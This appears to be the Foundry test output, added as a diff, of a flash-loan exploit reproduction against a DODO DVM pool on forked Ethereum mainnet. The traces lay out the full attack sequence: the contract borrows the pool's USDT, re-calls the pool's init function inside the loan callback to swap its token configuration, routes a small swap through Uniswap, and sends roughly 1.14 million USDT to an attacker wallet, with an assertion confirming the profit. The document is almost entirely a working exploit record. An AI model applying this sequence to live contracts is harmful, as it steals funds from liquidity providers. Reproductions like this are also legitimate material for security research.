@@ -1,0 +1,138 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/dodo_flashloan_exp.sol:ContractTest
+[PASS] testExploit() (gas: 280923)
+Logs:
+  [*] DVM wCRES balance: 134897917762348532103754
+  [*] DVM USDT balance: 1150965863028
+  [cb] USDT borrowed: 1150965863028
+  [cb] wCRES now in DVM: 134899448310314856073562
+  [cb] USDT remaining in this contract: 1140965863028
+  [cb] USDT sent to mywallet: 1140965863028
+  [*] USDT profit: 1140965863028
+  [*] wCRES profit: 0
+
+Traces:
+  [27944] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 12000000 [1.2e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [340723] ContractTest::testExploit()
+    ├─ [5031] TetherToken::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2441] WrappedERC20::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2441] WrappedERC20::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   └─ ← [Return] 134897917762348532103754 [1.348e23]
+    ├─ emit log_named_uint(key: "[*] DVM wCRES balance", val: 134897917762348532103754 [1.348e23])
+    ├─ [3031] TetherToken::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   └─ ← [Return] 1150965863028 [1.15e12]
+    ├─ emit log_named_uint(key: "[*] DVM USDT balance", val: 1150965863028 [1.15e12])
+    ├─ [1031] TetherToken::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   └─ ← [Return] 1150965863028 [1.15e12]
+    ├─ [289157] DVM::flashLoan(0, 1150965863028 [1.15e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x78)
+    │   ├─ [286458] DVM::flashLoan(0, 1150965863028 [1.15e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x78) [delegatecall]
+    │   │   ├─ [37601] TetherToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1150965863028 [1.15e12])
+    │   │   │   ├─ emit Transfer(from: DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1150965863028 [1.15e12])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd1c828dd8cb015122018b7a5b3d45570500b6041a1ef462bd5763eb10bf967c4: 0x0000000000000000000000000000000000000000000000000000010bfae95274 → 0
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x0000000000000000000000000000000000000000000000000000010bfae95274
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [200170] ContractTest::DVMFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 1150965863028 [1.15e12], 0x78)
+    │   │   │   ├─ emit log_named_uint(key: "[cb] USDT borrowed", val: 1150965863028 [1.15e12])
+    │   │   │   ├─ [47961] DVM::init(0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0, TetherToken: [0xdAC17F958D2ee523a2206206994597C13D831ec7], WrappedERC20: [0xa0afAA285Ce85974c3C881256cB7F225e3A1178a], 0, FeeRateModel: [0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01], 1, 0, false)
+    │   │   │   │   ├─ [47750] DVM::init(0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0, TetherToken: [0xdAC17F958D2ee523a2206206994597C13D831ec7], WrappedERC20: [0xa0afAA285Ce85974c3C881256cB7F225e3A1178a], 0, FeeRateModel: [0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01], 1, 0, false) [delegatecall]
+    │   │   │   │   │   ├─ [2484] TetherToken::decimals() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 1: 0x000000000000000000000000a0afaa285ce85974c3c881256cb7f225e3a1178a → 0x000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7
+    │   │   │   │   │   │   @ 6: 18 → 6
+    │   │   │   │   │   │   @ 15: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   │   │   │   @ 2: 0x000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7 → 0x000000000000000000000000a0afaa285ce85974c3c881256cb7f225e3a1178a
+    │   │   │   │   │   │   @ 13: 0x000000000000000000000000000000000000000000000000000aa87bee538000 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [24953] TetherToken::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 10000000000 [1e10])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 10000000000 [1e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa148fe3774b01d96c7f9fa0871ef8d1ba8e10a558de225107d95bbe1cefdeca9: 0 → 0x00000000000000000000000000000000000000000000000000000002540be400
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [68470] UniswapV2Router02::swapExactTokensForTokens(10000000000 [1e10], 1, [0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a], DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6], 1615234916 [1.615e9])
+    │   │   │   │   ├─ [2504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1531834235304015592 [1.531e18], 8378765 [8.378e6], 1608821471 [1.608e9]
+    │   │   │   │   ├─ [12124] TetherToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV2Pair: [0xA0C9307dA8040B48CB2C4bdEB9Cc3B726107A7D3], 10000000000 [1e10])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0xA0C9307dA8040B48CB2C4bdEB9Cc3B726107A7D3], value: 10000000000 [1e10])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x97e9471a93a8309b0fb84b46e5ccfe87305c8a2beeb2b0dca82f42205828f3db: 0x00000000000000000000000000000000000000000000000000000000007fd98d → 0x00000000000000000000000000000000000000000000000000000002548bbd8d
+    │   │   │   │   │   │   @ 0xa148fe3774b01d96c7f9fa0871ef8d1ba8e10a558de225107d95bbe1cefdeca9: 0x00000000000000000000000000000000000000000000000000000002540be400 → 0
+    │   │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x0000000000000000000000000000000000000000000000000000010bfae95274 → 0x00000000000000000000000000000000000000000000000000000109a6dd6e74
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [43650] UniswapV2Pair::swap(1530547966323969808 [1.53e18], 0, DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6], 0x)
+    │   │   │   │   │   ├─ [10855] WrappedERC20::transfer(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6], 1530547966323969808 [1.53e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xA0C9307dA8040B48CB2C4bdEB9Cc3B726107A7D3], to: DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6], value: 1530547966323969808 [1.53e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xdf7db3be09851f5f66a4a3c954eab9dde76bc2b5aa9e1c1638c9ddfe3d45d0d1: 0x000000000000000000000000000000000000000000001c90d4adad0e619ffa4a → 0x000000000000000000000000000000000000000000001c90e9eb4652860fc95a
+    │   │   │   │   │   │   │   @ 0xc53d176912ab733aa49295dee15cfb64d891310ac1558080e621e18d6a58bc85: 0x00000000000000000000000000000000000000000000000015422b1efa13f6e8 → 0x000000000000000000000000000000000000000000000000000491dad5a427d8
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [441] WrappedERC20::balanceOf(UniswapV2Pair: [0xA0C9307dA8040B48CB2C4bdEB9Cc3B726107A7D3]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1286268980045784 [1.286e15]
+    │   │   │   │   │   ├─ [1031] TetherToken::balanceOf(UniswapV2Pair: [0xA0C9307dA8040B48CB2C4bdEB9Cc3B726107A7D3]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 10008378765 [1e10]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 1286268980045784 [1.286e15], reserve1: 10008378765 [1e10])
+    │   │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 10000000000 [1e10], amount0Out: 1530547966323969808 [1.53e18], amount1Out: 0, to: DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 9: 0x0000000000000000000000000000000000000065d93b4927cbb6e8ac7f73c11c → 0x000000000000000000000000000000000000006825c4662dbcd711a8d7378c1d
+    │   │   │   │   │   │   @ 8: 0x5fe4aadf00000000000000000000007fd98d00000000000015422b1efa13f6e8 → 0x6046870000000000000000000002548bbd8d000000000000000491dad5a427d8
+    │   │   │   │   │   │   @ 10: 0x00000000000000000000034df57d432243f75ddc48e85d31a31b5451ee4857c0 → 0x0000000000000000000013938ca74f4c975b7ae8aaae83dd24c3e8db7c3efca3
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] [10000000000 [1e10], 1530547966323969808 [1.53e18]]
+    │   │   │   ├─ [441] WrappedERC20::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   │   │   │   └─ ← [Return] 134899448310314856073562 [1.348e23]
+    │   │   │   ├─ emit log_named_uint(key: "[cb] wCRES now in DVM", val: 134899448310314856073562 [1.348e23])
+    │   │   │   ├─ [1031] TetherToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1140965863028 [1.14e12]
+    │   │   │   ├─ emit log_named_uint(key: "[cb] USDT remaining in this contract", val: 1140965863028 [1.14e12])
+    │   │   │   ├─ [1031] TetherToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1140965863028 [1.14e12]
+    │   │   │   ├─ [24801] TetherToken::transfer(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 1140965863028 [1.14e12])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 1140965863028 [1.14e12])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x00000000000000000000000000000000000000000000000000000109a6dd6e74 → 0
+    │   │   │   │   │   @ 0xd1b0d319c6526317dce66989b393dcfb4435c9a65e399a088b63bbf65d7aee32: 0 → 0x00000000000000000000000000000000000000000000000000000109a6dd6e74
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1031] TetherToken::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1140965863028 [1.14e12]
+    │   │   │   ├─ emit log_named_uint(key: "[cb] USDT sent to mywallet", val: 1140965863028 [1.14e12])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1031] TetherToken::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [441] WrappedERC20::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   │   │   └─ ← [Return] 134899448310314856073562 [1.348e23]
+    │   │   ├─ [15079] FeeRateModel::getFeeRate(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   │   │   ├─ [9378] FeeRateImpl::getFeeRate(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6], DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit DODOSwap(fromToken: WrappedERC20: [0xa0afAA285Ce85974c3C881256cB7F225e3A1178a], toToken: TetherToken: [0xdAC17F958D2ee523a2206206994597C13D831ec7], fromAmount: 134899448309163890210534 [1.348e23], toAmount: 134897917762348532103754 [1.348e23], trader: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], receiver: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ [1031] TetherToken::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [441] WrappedERC20::balanceOf(DVM: [0x051EBD717311350f1684f89335bed4ABd083a2b6]) [staticcall]
+    │   │   │   └─ ← [Return] 134899448310314856073562 [1.348e23]
+    │   │   ├─ emit DODOFlashLoan(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], assetTo: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], baseAmount: 0, quoteAmount: 1150965863028 [1.15e12])
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0x000000000000000000000000010bfae95274000000001c90d4adad0e619ffa4a → 0x00000000000000001c90e9eb4652860fc95a0000000000000000000000000000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1031] TetherToken::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 1140965863028 [1.14e12]
+    ├─ [441] WrappedERC20::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "[*] USDT profit", val: 1140965863028 [1.14e12])
+    ├─ emit log_named_uint(key: "[*] wCRES profit", val: 0)
+    ├─ [0] VM::assertGt(1140965863028 [1.14e12], 0, "no USDT profit - exploit failed") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 965.56ms (11.63ms CPU time)
+
+Ran 1 test suite in 2.54s (965.56ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
